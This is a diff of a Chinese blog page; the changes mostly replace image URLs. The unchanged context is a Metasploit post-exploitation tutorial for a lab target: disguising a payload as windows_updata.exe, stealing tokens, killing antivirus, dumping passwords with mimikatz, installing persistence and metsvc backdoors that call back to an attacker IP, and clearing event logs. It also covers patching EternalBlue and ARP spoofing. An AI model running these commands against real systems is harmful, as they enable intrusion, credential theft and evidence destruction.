+<p>下面以其中一个举例：（其他几个操作类似）</p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100322981.png" alt="image-20231109100322981"></p>
 <h3 id="提高程序运行级别"><a href="#提高程序运行级别" class="headerlink" title="提高程序运行级别"></a>提高程序运行级别</h3><blockquote>
 <p>这种方法可以利用<code>exploit/windows/local/ask模块</code>，但是该模块实际上只是以高权限重启一个返回式shellcode,并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择“yes”，就可以程序返回一个高权限meterpreter shell(需要执行getsystem)。</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317929928.png" alt="set信息"><br>注：我们可以把name改为windows_updata.exe迷惑操作者。</p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639317543810.png" alt="靶机弹窗"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639318047407.png" alt="getsystem"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100332438.png" alt="image-20231109100332438"><br>注：我们可以把name改为windows_updata.exe迷惑操作者。</p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100341663.png" alt="image-20231109100341663"></p>
 <h3 id="利用windows提权漏洞进行提权"><a href="#利用windows提权漏洞进行提权" class="headerlink" title="利用windows提权漏洞进行提权"></a>利用windows提权漏洞进行提权</h3><blockquote>
 <p>上述getsystem提权需要用户在管理组，如果不是，就需要使用其他方法提权。这里介绍利用已有的漏洞进行提权。</p>
 </blockquote>
@@ -1115,7 +1112,7 @@
 <li><p><code>run</code></p>
 </li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639368455537.png" alt="查询"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100356238.png" alt="image-20231109100356238"></p>
 <h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><blockquote>
 <p>另一个提权的方法是扮演一个帐户从一个特定进程偷取令牌。为此，我们需要“incognito”扩展.</p>
 </blockquote>
@@ -1124,26 +1121,26 @@
 <li><code>list_tokens -u </code>  							#查看可用的token</li>
 <li><code>impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;</code> 		#假冒SYSTEM token</li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370391327.png" alt="假冒token"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100405201.png" alt="image-20231109100405201"></p>
 <ul>
 <li><code>list_tokens -g</code> #列出目标主机用户组的可用令牌</li>
 </ul>
-<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370584443.png" alt="用户组可用令牌"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100416549.png" alt="image-20231109100416549"></p>
 <ul>
 <li>meterpreter &gt;<code>execute -f cmd.exe -i -t</code> #调用域权限shell</li>
 <li><code>chcp 65001</code> #UTF-8编码代码页，解决乱码</li>
 <li>meterpreter &gt; <code>getuid</code></li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639370812087.png" alt="shell"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100426075.png" alt="image-20231109100426075"></p>
 <ul>
 <li><code>steal_token </code>	#从指定进程中窃取token   先ps列出可用的值</li>
 <li><code>drop_token</code>			#删除窃取的token</li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371086237.png" alt="进程"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100436238.png" alt="image-20231109100436238"></p>
 <ul>
 <li><p><code>rev2self </code>  			#返回原始token</p>
 </li>
-<li><p><code>migrate+pid </code>  #将当前会话进程迁移到一个指定的进程ID<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639371481362.png" alt="进程迁移"></p>
+<li><p><code>migrate+pid </code>  #将当前会话进程迁移到一个指定的进程ID<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100445906.png" alt="image-20231109100445906"></p>
 </li>
 </ul>
 <h2 id="后续提权操作"><a href="#后续提权操作" class="headerlink" title="后续提权操作"></a>后续提权操作</h2><h3 id="基本信息搜集"><a href="#基本信息搜集" class="headerlink" title="基本信息搜集"></a>基本信息搜集</h3><ol>
@@ -1152,32 +1149,32 @@
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309037371.png" alt="是否运行在虚拟机"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100454752.png" alt="image-20231109100454752"></p>
 <ol start="2">
 <li>关闭杀毒软件<blockquote>
 <p><code>run killav </code></p>
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309117079.png" alt="关闭杀毒软件"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100506126.png" alt="image-20231109100506126"></p>
 <ol start="3">
 <li>获取安装软件信息<blockquote>
 <p><code>run post/windows/gather/enum_applications</code> #获取安装软件信息</p>
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372062857.png" alt="软件信息"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100514793.png" alt="image-20231109100514793"></p>
 <ol start="4">
 <li>获取最近的文件操作<blockquote>
 <p><code>run post/windows/gather/dumplinks</code>   #获取最近的文件操作</p>
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639372106444.png" alt="文件操作"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100523697.png" alt="image-20231109100523697"></p>
 <ol start="5">
 <li>列举登录过的用户</li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639309269151.png" alt="列举登录过的用户"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100532976.png" alt="image-20231109100532976"></p>
 <h3 id="hash与明文密码读取"><a href="#hash与明文密码读取" class="headerlink" title="hash与明文密码读取"></a>hash与明文密码读取</h3><ul>
 <li><code>load mimikatz</code>    #help mimikatz 查看帮助</li>
 <li><code> wdigest</code>  #获取Wdigest密码</li>
@@ -1203,7 +1200,7 @@
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote>
 <p>信息收集的脚本位于：<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;gather<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;linux&#x2F;gather</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639373652409.png" alt="脚本位置"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100541994.png" alt="image-20231109100541994"></p>
 <ul>
 <li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</li>
 <li>run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</li>
@@ -1222,7 +1219,7 @@
 <li>run persistence –h  #查看帮助</li>
 <li>run persistence -X -i 5 -p 6661 -r 192.168.159.134 #-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374019249.png" alt="后门1"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100551201.png" alt="image-20231109100551201"></p>
 <p>后门的连接：</p>
 <ul>
 <li>msf &gt; use exploit&#x2F;multi&#x2F;handler</li>
@@ -1232,10 +1229,7 @@
 <li>msf &gt; exploit</li>
 </ul>
 <p> 也可以自己生成被控端，而后通过upload指令将其放到靶机的启动目录。</p>
-<p> <img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320429265.png" alt="被控端生成"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320736490.png" alt="主控端"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639320789421.png" alt="靶机运行"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639321161778.png" alt="连接成功"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100606830.png" alt="image-20231109100606830"></p>
 <h3 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h3><blockquote>
 <p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p>
 </blockquote>
@@ -1243,7 +1237,7 @@
 <li>run metsvc –h   # 查看帮助</li>
 <li>run metsvc –A   #自动安装后门</li>
 </ul>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639374688570.png" alt="服务后门"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100628026.png" alt="image-20231109100628026"></p>
 <ul>
 <li>msf &gt; use exploit&#x2F;multi&#x2F;handler</li>
 <li>msf &gt; set payload windows&#x2F;metsvc_bind_tcp</li>
@@ -1254,7 +1248,7 @@
 <h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><blockquote>
 <p><code>run event_manager -c</code>    #清除目标系统的事件日志</p>
 </blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639375334920.png" alt="痕迹清理"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100638600.png" alt="image-20231109100638600"></p>
 <h1 id="报告阶段"><a href="#报告阶段" class="headerlink" title="报告阶段"></a>报告阶段</h1><p>报告是渗透测试过程中最为重要的因素，使用报告文档来交流在渗透测试过程中做了哪些，如何做的，以及最为重要的—-客户组织如何修复所发现的安全漏洞和弱点。</p>
 <p>永恒之蓝漏洞的修复与防范：</p>
 <h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><ol>
@@ -1277,7 +1271,7 @@
 <li>将DWORD值重命名为“SMBDeviceEnabled”</li>
 <li>修改”数值数据”的值为0,点击确定，完成设置</li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376468455.png" alt="关闭445"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100648295.png" alt="image-20231109100648295"></p>
 <h4 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h4><blockquote>
 <p>135端口：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。</p>
 </blockquote>
@@ -1288,7 +1282,7 @@
 <li>在”默认属性”选项卡中，去掉”在此计算机上启用分布式COM”前的勾。</li>
 <li>选择”默认协议”选项卡，选中”面向连接的TCP&#x2F;IP”，单击”移除”按钮。</li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376646107.png" alt="关闭135"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100657769.png" alt="image-20231109100657769"></p>
 <p>　</p>
 <h4 id="关闭137、138、139端口"><a href="#关闭137、138、139端口" class="headerlink" title="关闭137、138、139端口"></a>关闭137、138、139端口</h4><blockquote>
 <p>137、138端口：137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS&#x2F;SMB服务</p>
@@ -1297,10 +1291,10 @@
 <li>打开网络共享中心 – 更改适配器设置</li>
 <li>右键点击属性，把框起来的选项前面的勾去掉，然后卸载</li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376806506.png" alt="1"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100708132.png" alt="image-20231109100708132"></p>
 <ol start="3">
 <li>双击Internet 协议版本 4 (TCP&#x2F;IPv4)– 高级–选择WIN</li>
-<li>勾选禁用TCP&#x2F;IP上的NetBIOS(S)<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1639376885411.png" alt="2"></li>
+<li>勾选禁用TCP&#x2F;IP上的NetBIOS(S)<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100717650.png" alt="image-20231109100717650"></li>
 </ol>
 <p>做完以上操作 重启即可关闭端口</p>
 <h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>如果中招 已经被勒索，建议360网址下载查杀工具：<a target="_blank" rel="noopener" href="http://dl.360safe.com/nsa/nsatool.exe">http://dl.360safe.com/nsa/nsatool.exe</a></p>
@@ -2121,7 +2115,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-08 17:57:16" itemprop="dateModified" datetime="2023-11-08T17:57:16+08:00">2023-11-08</time>
+      <time title="修改时间：2023-11-09 10:08:35" itemprop="dateModified" datetime="2023-11-09T10:08:35+08:00">2023-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -2176,8 +2170,9 @@
 </blockquote>
 <p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的<strong>所有主机</strong>，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
 <p>每一个主机都有一个<code>ARP高速缓存</code>，此缓存中记录了最近一段时间内其它<code>IP地址与其MAC地址的对应关系</code>。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机<strong>广播一个ARP请求报文</strong>，其意义是”如果你有此IP地址，请告诉我你的MAC地址”，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。</p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1638085951628.png" alt="arp报文格式"></p>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1638086179434.png" alt="wirshark抓取"></p>
+<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100813247.png" alt="image-20231109100813247" style="zoom:50%;" />
+
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100832839.png" alt="image-20231109100832839"></p>
 <h3 id="arp协议的缺点–arp欺骗"><a href="#arp协议的缺点–arp欺骗" class="headerlink" title="arp协议的缺点–arp欺骗"></a>arp协议的缺点–arp欺骗</h3><p>可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到<strong>ARP欺骗</strong>的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。</p>
 <h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><blockquote>
 <p>IP是<strong>Internet Protocol</strong>（网际互连协议）的缩写,是TCP&#x2F;IP体系中的网络层协议。</p>
